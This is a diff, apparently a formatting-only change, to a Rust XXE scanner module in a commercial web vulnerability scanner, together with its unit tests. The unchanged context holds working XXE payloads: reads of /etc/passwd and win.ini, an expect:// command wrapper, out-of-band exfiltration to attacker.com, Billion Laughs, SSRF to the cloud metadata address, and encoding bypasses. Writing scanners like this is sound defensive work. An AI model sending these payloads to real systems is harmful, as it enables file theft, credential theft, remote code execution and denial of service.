@@ -8,7 +8,6 @@
  * @copyright 2026 Bountyy Oy
  * @license Proprietary - Enterprise Edition
  */
-
 use crate::detection_helpers::AppCharacteristics;
 use crate::http_client::HttpClient;
 use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
@@ -34,7 +33,8 @@ impl XxeScanner {
         parameter: &str,
         config: &ScanConfig,
     ) -> Result<(Vec<Vulnerability>, usize)> {
-        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard).await
+        self.scan_parameter_with_intensity(base_url, parameter, config, PayloadIntensity::Standard)
+            .await
     }
 
     /// Scan parameter for XXE vulnerabilities with specified intensity (intelligent mode)
@@ -51,10 +51,12 @@ impl XxeScanner {
             return Ok((Vec::new(), 0));
         }
 
-        info!("[XXE] Intelligent scanner - parameter: {} (priority: {}, intensity: {:?})",
-              parameter,
-              ParameterFilter::get_parameter_priority(parameter),
-              intensity);
+        info!(
+            "[XXE] Intelligent scanner - parameter: {} (priority: {}, intensity: {:?})",
+            parameter,
+            ParameterFilter::get_parameter_priority(parameter),
+            intensity
+        );
 
         let mut vulnerabilities = Vec::new();
         let mut tests_run = 0;
@@ -65,14 +67,17 @@ impl XxeScanner {
 
         // Skip XXE for JSON-only APIs unless multipart/file upload is detected
         if characteristics.is_api && !characteristics.has_file_upload {
-            let content_type = baseline_response.headers.get("content-type")
+            let content_type = baseline_response
+                .headers
+                .get("content-type")
                 .map(|s| s.to_lowercase())
                 .unwrap_or_default();
 
-            if content_type.contains("application/json") ||
-               content_type.contains("application/graphql") ||
-               baseline_response.body.trim_start().starts_with('{') ||
-               baseline_response.body.trim_start().starts_with('[') {
+            if content_type.contains("application/json")
+                || content_type.contains("application/graphql")
+                || baseline_response.body.trim_start().starts_with('{')
+                || baseline_response.body.trim_start().starts_with('[')
+            {
                 info!("[XXE] Skipping XXE (JSON-only API without file upload - XXE requires XML parsing)");
                 return Ok((vulnerabilities, tests_run));
             }
@@ -85,17 +90,36 @@ impl XxeScanner {
             tests_run += 1;
 
             let test_url = if base_url.contains('?') {
-                format!("{}&{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}&{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             } else {
-                format!("{}?{}={}", base_url, parameter, urlencoding::encode(payload))
+                format!(
+                    "{}?{}={}",
+                    base_url,
+                    parameter,
+                    urlencoding::encode(payload)
+                )
             };
 
-            debug!("Testing XXE payload: {} -> {}", parameter, payload.chars().take(50).collect::<String>());
+            debug!(
+                "Testing XXE payload: {} -> {}",
+                parameter,
+                payload.chars().take(50).collect::<String>()
+            );
 
             match self.http_client.get(&test_url).await {
                 Ok(response) => {
-                    if let Some(vuln) = self.analyze_xxe_response(&response, payload, parameter, &test_url) {
-                        info!("[ALERT] XXE vulnerability detected in parameter '{}'", parameter);
+                    if let Some(vuln) =
+                        self.analyze_xxe_response(&response, payload, parameter, &test_url)
+                    {
+                        info!(
+                            "[ALERT] XXE vulnerability detected in parameter '{}'",
+                            parameter
+                        );
                         vulnerabilities.push(vuln);
                         break; // Found vulnerability, stop testing this parameter
                     }
@@ -124,22 +148,22 @@ impl XxeScanner {
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<root><data>&xxe;</data></root>"#.to_string(),
-
+<root><data>&xxe;</data></root>"#
+                .to_string(),
             // Classic XXE - File disclosure (Windows)
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ]>
-<root><data>&xxe;</data></root>"#.to_string(),
-
+<root><data>&xxe;</data></root>"#
+                .to_string(),
             // XXE with PHP expect wrapper (RCE)
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "expect://id">
 ]>
-<root><data>&xxe;</data></root>"#.to_string(),
-
+<root><data>&xxe;</data></root>"#
+                .to_string(),
             // XXE via parameter entities
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
@@ -147,8 +171,8 @@ impl XxeScanner {
 <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
 %dtd;
 ]>
-<root><data>&send;</data></root>"#.to_string(),
-
+<root><data>&send;</data></root>"#
+                .to_string(),
             // Billion Laughs Attack (XXE DoS)
             r#"<?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -157,23 +181,23 @@ impl XxeScanner {
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 ]>
-<lolz>&lol4;</lolz>"#.to_string(),
-
+<lolz>&lol4;</lolz>"#
+                .to_string(),
             // SSRF via XXE
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 ]>
-<root><data>&xxe;</data></root>"#.to_string(),
-
+<root><data>&xxe;</data></root>"#
+                .to_string(),
             // XXE via SOAP
             r#"<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <soap:Body><data>&xxe;</data></soap:Body>
-</soap:Envelope>"#.to_string(),
-
+</soap:Envelope>"#
+                .to_string(),
             // XXE via SVG file
             r#"<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
@@ -181,34 +205,35 @@ impl XxeScanner {
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
 <text>&xxe;</text>
-</svg>"#.to_string(),
-
+</svg>"#
+                .to_string(),
             // XInclude attack
             r#"<foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>"#.to_string(),
-
+</foo>"#
+                .to_string(),
             // XXE with UTF-7 encoding bypass
             r#"+ADw?xml version=+ACI-1.0+ACI?+AD4
 +ADw!DOCTYPE foo+AFs
 +ADw!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI+AD4
 +AF0+AD4
-+ADw-root+AD4+ADw-data+AD4+ACY-xxe+ADsAPA-/data+AD4APA-/root+AD4"#.to_string(),
-
++ADw-root+AD4+ADw-data+AD4+ACY-xxe+ADsAPA-/data+AD4APA-/root+AD4"#
+                .to_string(),
             // Blind XXE - Out of band
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY % xxe SYSTEM "http://attacker.com/xxe">
 %xxe;
 ]>
-<root></root>"#.to_string(),
-
+<root></root>"#
+                .to_string(),
             // XXE with base64 encoding
             r#"<?xml version="1.0"?>
 <!DOCTYPE foo [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
-<root><data>&xxe;</data></root>"#.to_string(),
+<root><data>&xxe;</data></root>"#
+                .to_string(),
         ]
     }
 
@@ -524,10 +549,22 @@ mod tests {
         assert!(payloads.len() >= 10, "Should have at least 10 XXE payloads");
 
         // Check for key attack types
-        assert!(payloads.iter().any(|p| p.contains("/etc/passwd")), "Missing /etc/passwd payload");
-        assert!(payloads.iter().any(|p| p.contains("win.ini")), "Missing Windows payload");
-        assert!(payloads.iter().any(|p| p.contains("lol")), "Missing Billion Laughs payload");
-        assert!(payloads.iter().any(|p| p.contains("169.254.169.254")), "Missing SSRF payload");
+        assert!(
+            payloads.iter().any(|p| p.contains("/etc/passwd")),
+            "Missing /etc/passwd payload"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("win.ini")),
+            "Missing Windows payload"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("lol")),
+            "Missing Billion Laughs payload"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("169.254.169.254")),
+            "Missing SSRF payload"
+        );
     }
 
     #[test]
@@ -536,7 +573,9 @@ mod tests {
 
         let response = crate::http_client::HttpResponse {
             status_code: 200,
-            body: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin".to_string(),
+            body:
+                "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
+                    .to_string(),
             headers: HashMap::new(),
             duration_ms: 100,
         };
@@ -545,7 +584,7 @@ mod tests {
             &response,
             r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
             "xml",
-            "http://example.com?xml=test"
+            "http://example.com?xml=test",
         );
 
         assert!(result.is_some(), "Should detect /etc/passwd disclosure");
@@ -568,7 +607,7 @@ mod tests {
             &response,
             r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>"#,
             "xml",
-            "http://example.com?xml=test"
+            "http://example.com?xml=test",
         );
 
         assert!(result.is_some(), "Should detect Windows file disclosure");
@@ -590,7 +629,7 @@ mod tests {
             &response,
             r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>"#,
             "xml",
-            "http://example.com?xml=test"
+            "http://example.com?xml=test",
         );
 
         assert!(result.is_some(), "Should detect SSRF via XXE");
@@ -612,9 +651,12 @@ mod tests {
             &response,
             r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
             "xml",
-            "http://example.com?xml=test"
+            "http://example.com?xml=test",
         );
 
-        assert!(result.is_none(), "Should not report false positive on normal response");
+        assert!(
+            result.is_none(),
+            "Should not report false positive on normal response"
+        );
     }
 }
